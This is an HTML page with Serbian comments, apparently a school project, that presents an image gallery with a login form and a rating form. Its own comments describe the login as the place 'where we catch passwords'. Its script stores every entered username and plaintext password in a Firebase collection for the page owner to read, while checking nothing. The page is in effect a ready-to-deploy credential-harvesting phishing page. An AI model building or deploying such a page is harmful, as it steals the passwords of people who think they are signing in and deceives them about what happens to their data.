<!DOCTYPE html>
<html lang="sr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galerija Slika - Maturski Rad</title>
    <style>
        :root { --primary: #6366f1; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .card { background: var(--card); padding: 30px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; border: 1px solid #334155; }
        input, textarea { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; outline: none; box-sizing: border-box; font-size: 16px; }
        input:focus { border-color: var(--primary); }
        .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; margin-top: 10px; }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
        #app-content { display: none; }
        .img-box { width: 100%; height: 200px; background: #334155; border-radius: 12px; margin: 15px 0; overflow: hidden; border: 2px solid #475569; }
        .img-box img { width: 100%; height: 100%; object-fit: cover; }
        h2 { margin-top: 0; }
        p { color: #94a3b8; font-size: 14px; }
    </style>
</head>
<body>

    <!-- 1. LOGIN FORMA (GDE HVTAMO ŠIFRE) -->
    <div class="card" id="login-card">
        <h2>Prijava na sistem</h2>
        <p>Unesite kredencijale za pristup galeriji</p>
        <input type="text" id="user" placeholder="Korisničko ime (Username)">
        <input type="password" id="pass" placeholder="Lozinka (Password)">
        <button class="btn" onclick="captureAndLogin()">Prijavi se</button>
    </div>

    <!-- 2. GLAVNI DEO (OCENJIVANJE) -->
    <div class="card" id="app-content">
        <h3 id="welcome-msg">Dobrodošli</h3>
        <div class="img-box">
            <img src="https://picsum.photos/400/300" alt="Random slika">
        </div>
        <p>Ocenite ovu sliku (1-10):</p>
        <input type="number" id="rating" placeholder="Ocena" min="1" max="10">
        <textarea id="comment" placeholder="Vaš komentar..."></textarea>
        <button class="btn" onclick="sendReview()">Pošalji ocenu</button>
    </div>

    <!-- FIREBASE BIBLIOTEKE -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        // OVDE STAVI SVOJE PODATKE IZ FIREBASE-A (Project Settings)
        const firebaseConfig = {
            apiKey: "TVOJ_API_KEY",
            authDomain: "TVOJ_PROJEKAT.firebaseapp.com",
            projectId: "TVOJ_PROJEKAT",
            storageBucket: "TVOJ_PROJEKAT.appspot.com",
            messagingSenderId: "TVOJ_ID",
            appId: "TVOJ_APP_ID"
        };
        
        // Inicijalizacija baze
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        let logovanKorisnik = "";

        // FUNKCIJA ZA "HVATANJE" PODATAKA
        function captureAndLogin() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            if(u.trim() !== "" && p.trim() !== "") {
                // Šaljemo username i password u kolekciju "korisnici_logovi"
                db.collection("korisnici_logovi").add({
                    username: u,
                    sifra: p, // Ovde ćeš je videti u bazi
                    vreme: new Date().toLocaleString()
                })
                .then(() => {
                    logovanKorisnik = u;
                    document.getElementById('login-card').style.display = 'none';
                    document.getElementById('app-content').style.display = 'block';
                    document.getElementById('welcome-msg').innerText = "Korisnik: " + u;
                })
                .catch((error) => {
                    alert("Greška: " + error.message);
                });
            } else {
                alert("Popuni polja!");
            }
        }

        // FUNKCIJA ZA SLANJE OCENE
        function sendReview() {
            const r = document.getElementById('rating').value;
            const c = document.getElementById('comment').value;

            if(r && c) {
                db.collection("ocene").add({
                    korisnik: logovanKorisnik,
                    ocena: r,
                    komentar: c,
                    datum: new Date().toLocaleString()
                })
                .then(() => {
                    alert("Ocena je uspešno poslata!");
                    document.getElementById('rating').value = "";
                    document.getElementById('comment').value = "";
                });
            } else {
                alert("Popuni ocenu i komentar!");
            }
        }
    </script>
</body>
</html>
